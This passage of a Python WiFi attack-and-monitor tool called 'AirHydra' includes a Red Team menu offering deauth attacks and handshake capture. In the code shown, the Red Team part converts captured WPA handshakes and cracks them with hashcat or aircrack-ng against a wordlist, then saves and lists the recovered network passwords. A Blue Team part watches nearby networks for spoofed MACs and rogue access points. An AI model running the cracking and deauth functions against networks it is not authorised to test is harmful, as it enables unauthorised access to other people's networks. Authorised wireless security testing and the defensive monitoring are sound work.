    if not shutil.which("hcxpcapngtool"):
        err("hcxpcapngtool not found! Install: sudo apt install hcxtools")
        return None
    hc_file = cap_file.replace(".cap", ".hc22000")
    step("Converting .cap to hashcat format...")
    subprocess.run(["hcxpcapngtool", "-o", hc_file, cap_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not os.path.exists(hc_file):
        err("Conversion failed! Try aircrack-ng instead.")
        return None
    info(f"Converted: {W}{hc_file}{RST}")
    print()
    step(f"Running hashcat (mode 22000, devices={devices})...")
    print(f"  {DIM}{'─'*45}{RST}\n")
    subprocess.run(["hashcat", "-m", "22000", "-D", devices, hc_file, wordlist, "--force", "--quiet"])
    r = subprocess.run(["hashcat", "-m", "22000", hc_file, "--show"], capture_output=True, text=True)
    if r.stdout.strip():
        try: return r.stdout.strip().split(":")[-1]
        except: pass
    return None

def crack_handshake(cfg):
    banner()
    head("RED TEAM – CRACK HANDSHAKE")
    cap_file = pick_cap_file()
    if not cap_file: return
    print()
    wordlist = input(f"  {W}Wordlist path: {RST}").strip()
    if not wordlist or not os.path.exists(wordlist):
        err("Wordlist not found!")
        return
    method, devices = pick_crack_method(cfg)
    if method == "aircrack": pwd = crack_with_aircrack(cap_file, wordlist)
    else: pwd = crack_with_hashcat(cap_file, wordlist, devices=devices)
    print()
    if pwd:
        ssid = os.path.basename(cap_file).replace("-01.cap", "").replace(".cap", "")
        out = save_cracked_result(cap_file, ssid, pwd)
        print(f"\n  {G}{'█'*47}")
        print(f"  ██   ✅  PASSWORD CRACKED!                  ██")
        print(f"  ██   SSID     : {ssid:<30}██")
        print(f"  ██   Password : {pwd:<30}██")
        print(f"  ██   Saved to : {os.path.basename(out):<30}██")
        print(f"  {'█'*47}{RST}\n")
    else:
        warn("Password not found. Try a different wordlist.")

def restore_only(iface, cfg):
    banner()
    head("RED TEAM – RESTORE INTERFACE")
    restore_interface(iface)

def list_captures():
    banner()
    head("RED TEAM – CAPTURED HANDSHAKES")
    cleanup_empty_caps()
    caps = sorted([f for f in glob.glob(os.path.join(CAP_DIR, "*.cap")) if os.path.isfile(f)])
    if not caps:
        warn(f"No captures found in {W}{CAP_DIR}{RST}")
        return
    results = checker.check_multiple(caps, reliable=False)
    print(f"  {W}{'#':<4} {'FILE':<35} {'SIZE':<10} HANDSHAKE{RST}")
    print(f"  {DIM}{'─'*65}{RST}")
    for i, cap in enumerate(caps, 1):
        size = os.path.getsize(cap)
        size_str = f"{size//1024}K" if size > 1024 else f"{size}B"
        fname = os.path.basename(cap)
        if len(fname) > 35: fname = fname[:32] + "..."
        hs = f"{G}✅ YES{RST}" if results.get(cap, False) else f"{R}✗  NO{RST}"
        print(f"  {C}{i:<4}{RST}{fname:<35} {size_str:<10} {hs}")
    print(f"\n  {DIM}Location: {CAP_DIR}{RST}")

def list_cracked():
    banner()
    head("RED TEAM – CRACKED PASSWORDS")
    files = sorted(glob.glob(os.path.join(CRACKED_DIR, "*_cracked.txt")))
    if not files:
        warn(f"No cracked passwords found in {W}{CRACKED_DIR}{RST}")
        return
    print(f"  {W}{'#':<4} {'SSID':<25} {'PASSWORD':<25} DATE{RST}")
    print(f"  {DIM}{'─'*70}{RST}")
    for i, f in enumerate(files, 1):
        data = {}
        with open(f, "r") as fh:
            for line in fh:
                if ":" in line:
                    k, v = line.split(":", 1)
                    data[k.strip()] = v.strip()
        ssid = data.get("SSID", "?")
        pwd = data.get("Password", "?")
        date = time.strftime("%Y-%m-%d", time.localtime(os.path.getmtime(f)))
        print(f"  {C}{i:<4}{RST}{ssid:<25} {G}{pwd:<25}{RST} {DIM}{date}{RST}")
    print(f"\n  {DIM}Location: {CRACKED_DIR}{RST}")

# ══════════════════════════════════════════════════
#  BLUE TEAM – SENTINEL MONITORING MODULE (Modular)
# ══════════════════════════════════════════════════

class DeviceTracker:
    def __init__(self):
        self.devices = {}
        self.ap_history = {}
        self.client_history = {}
        self.anomaly_log = []
        self.current_scan_macs = set()

    def update_ap(self, bssid, essid, channel, rssi, enc):
        now = time.time()
        if bssid not in self.ap_history:
            self.ap_history[bssid] = []
        self.ap_history[bssid].append((now, rssi, channel))
        if len(self.ap_history[bssid]) > 20:
            self.ap_history[bssid].pop(0)
        if bssid not in self.devices:
            self.devices[bssid] = DeviceInfo(bssid, is_ap=True, essid=essid)
        dev = self.devices[bssid]
        dev.essid = essid
        dev.channel = channel
        dev.rssi_history.append(rssi)
        dev.last_seen = now
        dev.encryption = enc
        if len(dev.rssi_history) > 20:
            dev.rssi_history.pop(0)

    def update_client(self, mac, bssid, rssi, channel):
        now = time.time()
        # Duplicate MAC detection within same scan
        if mac in self.current_scan_macs:
            self.anomaly_log.append(("DUPLICATE_MAC", mac, f"MAC address {mac} appears multiple times in same scan (spoofing)"))
            if mac in self.devices:
                self.devices[mac].confidence -= 40
        else:
            self.current_scan_macs.add(mac)

        if mac not in self.client_history:
            self.client_history[mac] = deque(maxlen=20)
        self.client_history[mac].append((now, rssi, bssid))
        if mac not in self.devices:
            self.devices[mac] = DeviceInfo(mac, is_ap=False)
        dev = self.devices[mac]
        dev.associated_ap = bssid
        dev.rssi_history.append(rssi)
        dev.last_seen = now
        if len(dev.rssi_history) > 20:
            dev.rssi_history.pop(0)
        if bssid not in dev.seen_bssids:
            dev.seen_bssids.append(bssid)
        if len(dev.seen_bssids) > 5:
            dev.seen_bssids.pop(0)

    def detect_mac_anomalies(self):
        anomalies = []
        for mac, dev in self.devices.items():
            if dev.is_ap: continue
            if len(dev.seen_bssids) >= 3:
                anomalies.append(("MAC_FLIP", mac, f"Connected to {len(dev.seen_bssids)} different APs in short time"))
                dev.confidence -= 30
            if len(dev.rssi_history) >= 3:
                diffs = [abs(dev.rssi_history[i] - dev.rssi_history[i-1]) for i in range(1, len(dev.rssi_history))]
                if max(diffs) > 40:
                    anomalies.append(("RSSI_JUMP", mac, f"RSSI jumped by {max(diffs)} dBm"))
                    dev.confidence -= 15
        return anomalies

    def detect_rogue_aps(self):
        anomalies = []
        ap_by_essid = defaultdict(list)
        for mac, dev in self.devices.items():
            if dev.is_ap and dev.essid and dev.essid != "<hidden>":
                ap_by_essid[dev.essid].append(mac)
        for essid, macs in ap_by_essid.items():
            if len(macs) > 1:
                for mac in macs:
                    dev = self.devices[mac]
                    other_mac = macs[0] if macs[0] != mac else macs[1]
                    other_dev = self.devices[other_mac]
                    enc_diff = (dev.encryption != other_dev.encryption)
                    try:
                        ch1 = int(dev.channel) if dev.channel else 0
                        ch2 = int(other_dev.channel) if other_dev.channel else 0
                        band_diff = (ch1 <= 14 and ch2 >= 36) or (ch1 >= 36 and ch2 <= 14)
                    except:
                        band_diff = False
                    rssi_diff = False
                    if dev.rssi_history and other_dev.rssi_history:
                        rssi_diff = abs(dev.rssi_history[-1] - other_dev.rssi_history[-1]) > 30
                    if enc_diff or band_diff or rssi_diff:
                        anomalies.append(("ROGUE_AP", mac, f"SSID '{essid}' on multiple BSSIDs (enc:{dev.encryption}/{other_dev.encryption} ch:{dev.channel}/{other_dev.channel})"))
                        dev.confidence -= 20
        return anomalies

    def assign_confidence_scores(self):
        for dev in self.devices.values():
            if dev.confidence < 0: dev.confidence = 0
            if dev.confidence > 100: dev.confidence = 100
            if len(dev.rssi_history) > 5 and max(dev.rssi_history) - min(dev.rssi_history) > 50:
                dev.confidence = max(0, dev.confidence - 10)
            if dev.is_ap and dev.encryption == "OPN":
                dev.confidence = max(0, dev.confidence - 20)

    def reset_scan_macs(self):
        self.current_scan_macs.clear()

class DeviceInfo:
    def __init__(self, mac, is_ap=False, essid=None):
        self.mac = mac
        self.is_ap = is_ap
        self.essid = essid
        self.channel = None
        self.encryption = None
        self.associated_ap = None
        self.rssi_history = []
        self.last_seen = time.time()
        self.seen_bssids = []
        self.confidence = 100

# ── Blue Team Helper: Start airodump for given BSSID (or global) ──
def start_airodump(mon_iface, bssid=None, channel=None, csv_prefix=BLUE_CSV_PREFIX):
    # Clean old CSV files
    for f in glob.glob(os.path.join(BLUE_DIR, "blue_scan*.csv")):
        try: os.remove(f)
        except: pass
    cmd = ["airodump-ng", "--band", "abg", "--write", csv_prefix, "--output-format", "csv"]
    if bssid and channel:
        cmd += ["--bssid", bssid, "-c", str(channel)]
    cmd.append(mon_iface)
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_latest_csv():
    files = glob.glob(os.path.join(BLUE_DIR, "blue_scan-*.csv"))
    if not files:
        return None
    return max(files, key=os.path.getmtime)

def parse_csv_and_update_tracker(csv_file, tracker):
    if not csv_file or not os.path.exists(csv_file):
        return
    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        sections = content.split("\n\n")
        # Parse APs
        if len(sections) >= 1:
            ap_lines = sections[0].splitlines()
            if len(ap_lines) > 1:
                reader = csv.reader(ap_lines[1:])
                for row in reader:
                    if len(row) < 14: continue
                    bssid = row[0].strip()
                    if not bssid or bssid == "BSSID" or len(bssid) < 10: continue
                    channel = row[3].strip()
                    enc = row[5].strip()
                    power = row[8].strip()
                    essid = row[13].strip() or "<hidden>"
                    try: rssi = int(power)
                    except: rssi = -100
                    tracker.update_ap(bssid, essid, channel, rssi, enc)
        # Parse clients
        if len(sections) >= 2:
            station_lines = sections[1].splitlines()
            if len(station_lines) > 1:
                reader = csv.reader(station_lines[1:])
                for row in reader:
                    if len(row) < 6: continue
                    mac = row[0].strip()
                    if not mac or mac == "Station MAC" or len(mac) < 10: continue
                    bssid = row[5].strip() if len(row) > 5 else ""
                    power = row[3].strip()
                    try: rssi = int(power)
                    except: rssi = -100
                    tracker.update_client(mac, bssid, rssi, None)
    except Exception:
        pass

# ── Mode 1: Global Monitor (original functionality) ──
def global_monitor(iface, cfg):
    banner()
    head("BLUE TEAM – GLOBAL MONITOR")
    print("  Monitoring all nearby APs and clients. Press Ctrl+C to stop.\n")
    mon_iface = start_monitor(iface)
    airodump_proc = start_airodump(mon_iface)
    time.sleep(3)
    tracker = DeviceTracker()
    last_parse_time = time.time()
    try:
        while True:
            if time.time() - last_parse_time >= 2:
                csv_file = get_latest_csv()
                if csv_file:
                    tracker.reset_scan_macs()
                    parse_csv_and_update_tracker(csv_file, tracker)
                    mac_anomalies = tracker.detect_mac_anomalies()
                    rogue_anomalies = tracker.detect_rogue_aps()
                    all_anomalies = tracker.anomaly_log + mac_anomalies + rogue_anomalies
                    tracker.anomaly_log = []
                    tracker.assign_confidence_scores()
                    os.system("clear")
                    banner()
                    head("BLUE TEAM – GLOBAL MONITOR")
                    print(f"  {C}Monitoring on {W}{mon_iface}{RST}\n")
                    if all_anomalies:
                        print(f"  {R}⚠️  ANOMALIES DETECTED ⚠️{RST}")
                        for typ, target, desc in all_anomalies:
                            print(f"    [{typ}] {target}: {desc}")
                        print()
                    else:
                        print(f"  {G}✅ No anomalies detected{RST}\n")
                    print(f"  {W}Access Points:{RST}")
                    print(f"  {DIM}{'BSSID':<20} {'ESSID':<25} {'CH':<4} {'RSSI':<6} {'Sec':<8} {'Conf':<6}{RST}")
                    ap_count = 0
                    for mac, dev in tracker.devices.items():
                        if dev.is_ap:
                            ap_count += 1
                            conf_color = G if dev.confidence > 70 else (Y if dev.confidence > 40 else R)
                            rssi_str = str(dev.rssi_history[-1]) if dev.rssi_history else "N/A"
                            print(f"  {mac:<20} {dev.essid[:25]:<25} {dev.channel:<4} {rssi_str:<6} {dev.encryption[:8]:<8} {conf_color}{dev.confidence:<3}{RST}")
                    if ap_count == 0:
                        print(f"  {DIM}No APs detected yet...{RST}")
                    print()
                    suspicious = [(mac, dev) for mac, dev in tracker.devices.items() if not dev.is_ap and dev.confidence < 70]
                    if suspicious:
                        print(f"  {Y}Suspicious Clients (Confidence < 70):{RST}")
                        print(f"  {DIM}{'MAC':<20} {'Associated AP':<25} {'RSSI':<6} {'Confidence':<10} {'Status':<15}{RST}")
                        for mac, dev in suspicious:
                            conf_color = G if dev.confidence > 70 else (Y if dev.confidence > 40 else R)
                            rssi_str = str(dev.rssi_history[-1]) if dev.rssi_history else "N/A"
                            ap_name = dev.associated_ap[:25] if dev.associated_ap else "None"
                            status = f"{R}LIKELY SPOOFED{RST}" if dev.confidence < 40 else f"{Y}Suspicious{RST}"
                            print(f"  {mac:<20} {ap_name:<25} {rssi_str:<6} {conf_color}{dev.confidence:<3}{RST}   {status}")
                        print()
                    else:
                        print(f"  {G}✅ No suspicious clients detected{RST}\n")
                last_parse_time = time.time()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n")
        info("Stopping Global Monitor...")
        airodump_proc.terminate()
        airodump_proc.wait()
        restore_interface(mon_iface)
        pause()

# ── Mode 2: Targeted Network Monitor (lock to AP) ──
def targeted_monitor(iface, cfg):
    banner()
    head("BLUE TEAM – TARGETED NETWORK MONITOR")
    mon_iface = start_monitor(iface)
    print()
    result = scan_and_select(mon_iface)
    if not result:
        warn("No target selected.")
        restore_interface(mon_iface)
        return
    bssid, channel, essid = result
    print()
    info(f"Locking monitor to target: {Y}{essid}{RST} ({bssid}, channel {channel})")
    airodump_proc = start_airodump(mon_iface, bssid=bssid, channel=channel)
    time.sleep(3)
    tracker = DeviceTracker()
    last_parse_time = time.time()
    try:
        while True:
            if time.time() - last_parse_time >= 2:
                csv_file = get_latest_csv()
                if csv_file:
                    tracker.reset_scan_macs()
                    parse_csv_and_update_tracker(csv_file, tracker)
                    # For targeted mode, we only care about the target AP and its clients
                    target_ap = tracker.devices.get(bssid)
                    if target_ap:
                        target_ap.is_ap = True  # ensure it's marked
                    mac_anomalies = tracker.detect_mac_anomalies()
                    rogue_anomalies = tracker.detect_rogue_aps()
                    all_anomalies = tracker.anomaly_log + mac_anomalies + rogue_anomalies
                    tracker.anomaly_log = []
                    tracker.assign_confidence_scores()
                    os.system("clear")
                    banner()
                    head("BLUE TEAM – TARGETED MONITOR")
                    print(f"  {C}Target AP: {W}{essid}{RST} ({bssid}) on channel {channel}\n")
                    if all_anomalies:
                        print(f"  {R}⚠️  ANOMALIES DETECTED ⚠️{RST}")
                        for typ, target, desc in all_anomalies:
                            print(f"    [{typ}] {target}: {desc}")
                        print()
                    else:
                        print(f"  {G}✅ No anomalies detected{RST}\n")
                    # Show target AP info
                    if target_ap:
                        conf_color = G if target_ap.confidence > 70 else (Y if target_ap.confidence > 40 else R)
                        rssi_str = str(target_ap.rssi_history[-1]) if target_ap.rssi_history else "N/A"
                        print(f"  {W}Target AP Details:{RST}")
                        print(f"    BSSID: {bssid}")
                        print(f"    ESSID: {essid}")
                        print(f"    Channel: {channel}")
                        print(f"    RSSI: {rssi_str}")
                        print(f"    Encryption: {target_ap.encryption}")
                        print(f"    Confidence: {conf_color}{target_ap.confidence}{RST}\n")
                    # Show associated clients
                    clients = [dev for dev in tracker.devices.values() if not dev.is_ap and dev.associated_ap == bssid]
                    if clients:
                        print(f"  {W}Clients connected to target:{RST}")
                        print(f"  {DIM}{'MAC':<20} {'RSSI':<6} {'Status':<15}{RST}")
                        for dev in clients:
                            rssi_str = str(dev.rssi_history[-1]) if dev.rssi_history else "N/A"
                            if dev.confidence >= 70:
                                status = f"{G}Legitimate{RST}"
                            elif dev.confidence >= 40:
                                status = f"{Y}Suspicious{RST}"
                            else:
                                status = f"{R}LIKELY SPOOFED{RST}"
                            print(f"  {dev.mac:<20} {rssi_str:<6} {status}")
                        print()
                    else:
                        print(f"  {DIM}No clients associated yet...{RST}\n")
                last_parse_time = time.time()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n")
        info("Stopping Targeted Monitor...")
        airodump_proc.terminate()
        airodump_proc.wait()
        restore_interface(mon_iface)
        pause()

# ── Mode 3: Device Tracker (single MAC) ──
def device_tracker(iface, cfg):
    banner()
    head("BLUE TEAM – DEVICE TRACKER")
    mon_iface = start_monitor(iface)
    print()
    # First, do a quick scan to get list of MACs
    print("  Scanning for devices...")
    scan_proc = subprocess.Popen(
        ["airodump-ng", "--band", "abg", "--write", os.path.join(BLUE_DIR, "quick_scan"),
         "--output-format", "csv", mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(10)
    scan_proc.terminate()
    scan_proc.wait()
    quick_csv = glob.glob(os.path.join(BLUE_DIR, "quick_scan-*.csv"))
    if quick_csv:
        quick_csv = quick_csv[0]
        devices = set()
        try:
            with open(quick_csv, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            sections = content.split("\n\n")
            if len(sections) >= 2:
                station_lines = sections[1].splitlines()
                if len(station_lines) > 1:
                    reader = csv.reader(station_lines[1:])
                    for row in reader:
                        if len(row) >= 1:
                            mac = row[0].strip()
                            if mac and mac != "Station MAC" and len(mac) >= 10:
                                devices.add(mac)
        except: pass
        for f in glob.glob(os.path.join(BLUE_DIR, "quick_scan*")):
            try: os.remove(f)
            except: pass
    else:
        warn("Could not scan devices. Please try again.")
        restore_interface(mon_iface)
        return
    if not devices:
        warn("No devices found. Ensure interface is in monitor mode.")
        restore_interface(mon_iface)
        return
    print(f"\n  {W}Found {len(devices)} device(s).{RST}\n")
    dev_list = sorted(devices)
    for i, mac in enumerate(dev_list, 1):
        print(f"    {C}{i}{RST}. {mac}")
    print()
    while True:
        try:
            choice = input(f"  {C}Select device # (or 0 to cancel): {RST}").strip()
            if choice == "0":
                restore_interface(mon_iface)
                return
            idx = int(choice) - 1
            if 0 <= idx < len(dev_list):
                target_mac = dev_list[idx]
                break
            warn("Invalid number.")
        except ValueError:
            warn("Enter a number.")
    info(f"Tracking device: {W}{target_mac}{RST}")
    # Restart airodump in global mode to capture all (we'll filter)
    airodump_proc = start_airodump(mon_iface)
    time.sleep(3)
    tracker = DeviceTracker()
    last_parse_time = time.time()
    history_rssi = deque(maxlen=20)
    history_aps = deque(maxlen=20)
    try:
        while True:
            if time.time() - last_parse_time >= 2:
                csv_file = get_latest_csv()
                if csv_file:
                    tracker.reset_scan_macs()
                    parse_csv_and_update_tracker(csv_file, tracker)
                    if target_mac in tracker.devices:
                        dev = tracker.devices[target_mac]
                        if dev.rssi_history:
                            history_rssi.append(dev.rssi_history[-1])
                        if dev.associated_ap:
                            history_aps.append(dev.associated_ap)
                    # Build RSSI trend string
                    rssi_trend = " → ".join(str(r) for r in list(history_rssi)[-5:]) if history_rssi else "N/A"
                    # Count AP changes
                    ap_changes = 0
                    prev = None
                    for ap in history_aps:
                        if prev and ap != prev:
                            ap_changes += 1
                        prev = ap
                    # Determine status
                    if dev.confidence >= 70:
                        status = f"{G}Legitimate{RST}"
                    elif dev.confidence >= 40:
                        status = f"{Y}Suspicious{RST}"
                    else:
                        status = f"{R}LIKELY SPOOFED{RST}"
                    os.system("clear")
                    banner()
                    head("BLUE TEAM – DEVICE TRACKER")
                    print(f"  {C}Tracking: {W}{target_mac}{RST}\n")
                    print(f"  RSSI Trend: {rssi_trend}")
                    print(f"  AP Changes: {ap_changes}")
                    print(f"  Confidence: {dev.confidence}")
                    print(f"  Status: {status}\n")
                    if dev.confidence < 40:
                        alert("Device exhibits spoofing indicators: multiple AP associations or RSSI instability")
                last_parse_time = time.time()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n")
        info("Stopping Device Tracker...")
        airodump_proc.terminate()
        airodump_proc.wait()
        restore_interface(mon_iface)
        pause()

# ── Mode 4: Rogue AP Hunter ──
def rogue_hunter(iface, cfg):
    banner()
    head("BLUE TEAM – ROGUE AP HUNTER")
    mon_iface = start_monitor(iface)
    print("  Scanning for rogue APs. Press Ctrl+C to stop.\n")
    airodump_proc = start_airodump(mon_iface)
    time.sleep(3)
    tracker = DeviceTracker()
    last_parse_time = time.time()
    try:
        while True:
            if time.time() - last_parse_time >= 5:  # scan every 5 seconds
                csv_file = get_latest_csv()
                if csv_file:
                    tracker.reset_scan_macs()
                    parse_csv_and_update_tracker(csv_file, tracker)
                    rogue_anomalies = tracker.detect_rogue_aps()
                    os.system("clear")
                    banner()
                    head("BLUE TEAM – ROGUE AP HUNTER")
                    print(f"  {C}Monitoring on {W}{mon_iface}{RST}\n")
                    if rogue_anomalies:
                        print(f"  {R}⚠️  ROGUE ACCESS POINTS DETECTED ⚠️{RST}\n")
                        # Group by SSID for better display
                        rogue_by_ssid = defaultdict(list)
                        for typ, target, desc in rogue_anomalies:
                            # Extract SSID from description
                            import re
                            match = re.search(r"SSID '([^']+)'", desc)
                            ssid = match.group(1) if match else "Unknown"
                            rogue_by_ssid[ssid].append((target, desc))
                        for ssid, entries in rogue_by_ssid.items():
                            print(f"  {Y}SSID: {ssid}{RST}")
                            for bssid, desc in entries:
                                print(f"    BSSID: {bssid}")
                                print(f"    Reason: {desc}\n")
                    else:
                        print(f"  {G}✅ No rogue APs detected{RST}\n")
                last_parse_time = time.time()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n")
        info("Stopping Rogue AP Hunter...")
        airodump_proc.terminate()
        airodump_proc.wait()
        restore_interface(mon_iface)
        pause()

# ── Blue Team Menu ──
def blue_team_menu(iface, cfg):
    while True:
        banner()
        head("BLUE TEAM – SENTINEL MODULES")
        print(f"  {W}[1]{RST}  Global Monitor (All APs & Clients)")
        print()
        print(f"  {W}[2]{RST}  Targeted Network Monitor (Lock to AP)")
        print()
        print(f"  {W}[3]{RST}  Device Tracker (Single MAC)")
        print()
        print(f"  {W}[4]{RST}  Rogue AP Hunter")
        print()
        print(f"  {W}[0]{RST}  Back to Main Menu")
        print()
        choice = input(f"  {C}Blue Team >{RST} ").strip()
        if choice == "0":
            break
        elif choice == "1":
            global_monitor(iface, cfg)
        elif choice == "2":
            targeted_monitor(iface, cfg)
        elif choice == "3":
            device_tracker(iface, cfg)
        elif choice == "4":
            rogue_hunter(iface, cfg)
        else:
            err("Invalid option.")
            time.sleep(1)

# ── Show interfaces ───────────────────────────────
def show_interfaces():
    result = subprocess.run(["airmon-ng"], capture_output=True, text=True)
    lines = result.stdout.strip().splitlines()
    ifaces = []
    for line in lines:
        if not line.strip(): continue
        if "PHY" in line and "Interface" in line: continue
        parts = line.split()
        if len(parts) < 3: continue
        iface = parts[1]
        chipset = " ".join(parts[3:]) if len(parts) > 3 else parts[2]
        ifaces.append({"iface": iface, "chipset": chipset})
    print(f"  {W}{'#':<4} {'Interface':<12} Chipset{RST}")
    print(f"  {DIM}{'─'*55}{RST}")
    for i, row in enumerate(ifaces, 1):
        print(f"  {C}{i:<4}{RST}{row['iface']:<12} {DIM}{row['chipset']}{RST}")
    print()
    return ifaces

# ── Red Team Submenu ──────────────────────────────
def red_team_menu(iface, cfg):
    while True:
        banner()
        head("RED TEAM – OFFENSIVE TOOLS")
        print(f"  {W}[1]{RST}  Normal Handshake Capture")
        print()
        print(f"  {W}[2]{RST}  Advanced Handshake (Auto Deauth)")
        print()
        print(f"  {W}[3]{RST}  Deauth Attack (may not work on 5GHz)")
        print()
        print(f"  {W}[4]{RST}  Crack Handshake")
        print()
        print(f"  {W}[5]{RST}  Restore Interface Only")
        print()
        print(f"  {W}[6]{RST}  List Captured Handshakes")
        print()
        print(f"  {W}[7]{RST}  List Cracked Passwords")
        print()
        print(f"  {W}[0]{RST}  Back to Main Menu")
        print()
        choice = input(f"  {C}Red Team >{RST} ").strip()
        if choice == "0":
            break
        elif choice == "1":
            normal_handshake(iface, cfg)
        elif choice == "2":
            advanced_handshake(iface, cfg)
        elif choice == "3":
            deauth_attack(iface, cfg)
        elif choice == "4":
            crack_handshake(cfg)
        elif choice == "5":
            restore_only(iface, cfg)
        elif choice == "6":
            list_captures()
        elif choice == "7":
            list_cracked()
        else:
            err("Invalid option.")
            time.sleep(1)

# ── Main ──────────────────────────────────────────
def main():
    check_root()
    check_tools()
    init_dirs()
    cfg = load_config()
    banner()
    ifaces = show_interfaces()
    iface = None
    if not ifaces:
        warn("No wireless interfaces found!")
        warn("Red Team options [1-5] and Blue Team require a WiFi adapter.")
        warn("You can still use Crack and List functions.")
    else:
        print(f"  {W}[0]{RST}  Exit")
        print()
        while not iface:
            try:
                choice = input(f"  {C}Select interface #: {RST}").strip()
                if choice == "0":
                    print(f"\n  {Y}[!] Goodbye!{RST}\n")
                    sys.exit(0)
                idx = int(choice) - 1
                if 0 <= idx < len(ifaces):
                    iface = ifaces[idx]['iface']
                    info(f"Using interface: {W}{iface}{RST}")
                    print()
                else:
                    warn("Invalid number, try again.")
            except (ValueError, EOFError):
                warn("Enter a number.")
    while True:
        banner()
        print(f"  {W}[1]{RST}  Red Team (Offensive)")
        print()
        print(f"  {W}[2]{RST}  Blue Team (Defensive – Sentinel Monitor)")
        print()
        print(f"  {W}[0]{RST}  Exit")
        print()
        choice = input(f"  {C}AirHydra >{RST} ").strip()
        if choice == "0":
            print(f"\n  {Y}[!] Goodbye!{RST}\n")
            sys.exit(0)
        elif choice == "1":
            if not iface:
                err("No interface selected. Please restart and select a WiFi adapter.")
                pause()
                continue
            red_team_menu(iface, cfg)
        elif choice == "2":
            if not iface:
                err("No interface selected. Please restart and select a WiFi adapter.")
                pause()
                continue
            blue_team_menu(iface, cfg)
        else:
            err("Invalid option.")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {Y}[!] Interrupted. Goodbye!{RST}\n")
        sys.exit(0)